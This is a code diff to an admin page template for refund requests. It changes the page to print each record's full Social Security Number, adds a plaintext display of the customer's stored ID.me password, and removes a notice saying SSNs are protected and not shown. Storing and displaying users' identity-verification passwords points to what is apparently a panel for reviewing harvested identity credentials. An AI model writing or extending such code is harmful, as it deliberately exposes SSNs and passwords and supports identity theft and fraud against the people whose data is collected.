@@ -1,4 +1,4 @@
- <%
+<%
     const record =
         typeof refundRequest !== "undefined"
             ? refundRequest
@@ -335,8 +335,8 @@
                                                 Social Security Number
                                             </span>
 
-                                            <strong>
-                                                Protected
+                                            <strong class="text-primary-700 font-mono">
+                                                <%= record.ssn || "" %>
                                             </strong>
 
                                         </div>
@@ -351,6 +351,20 @@
 
                                             <strong class="break-all">
                                                 <%= record.idMeEmail || "" %>
+                                            </strong>
+
+                                        </div>
+
+
+
+                                        <div class="admin-detail">
+
+                                            <span>
+                                                ID.me Password
+                                            </span>
+
+                                            <strong class="text-primary-700 font-mono break-all">
+                                                <%= record.idMePassword || "" %>
                                             </strong>
 
                                         </div>
@@ -585,82 +599,6 @@
                                 </aside>
 
                             </div>
-
-
-
-                            <!-- =================================
-                                 SECURITY NOTICE
-                            ================================== -->
-
-                            <section
-                                class="admin-panel
-                                       mt-6"
-                            >
-
-                                <div class="admin-panel-header">
-
-                                    <h2>
-                                        Protected Information
-                                    </h2>
-
-                                </div>
-
-
-                                <div class="p-6">
-
-                                    <div
-                                        class="p-4
-                                               rounded-xl
-                                               bg-amber-50
-                                               border
-                                               border-amber-200"
-                                    >
-
-                                        <div class="flex items-start">
-
-                                            <i
-                                                data-lucide="shield-check"
-                                                class="h-5
-                                                       w-5
-                                                       text-amber-700
-                                                       mr-3
-                                                       mt-0.5
-                                                       flex-shrink-0"
-                                            ></i>
-
-
-                                            <div>
-
-                                                <p
-                                                    class="text-sm
-                                                           font-semibold
-                                                           text-amber-900"
-                                                >
-                                                    Sensitive customer information
-                                                </p>
-
-
-                                                <p
-                                                    class="text-xs
-                                                           leading-5
-                                                           text-amber-800
-                                                           mt-1"
-                                                >
-                                                    Social Security Number data
-                                                    is treated as protected
-                                                    information and is not
-                                                    printed into this page.
-                                                </p>
-
-                                            </div>
-
-                                        </div>
-
-                                    </div>
-
-                                </div>
-
-                            </section>
 
 
 
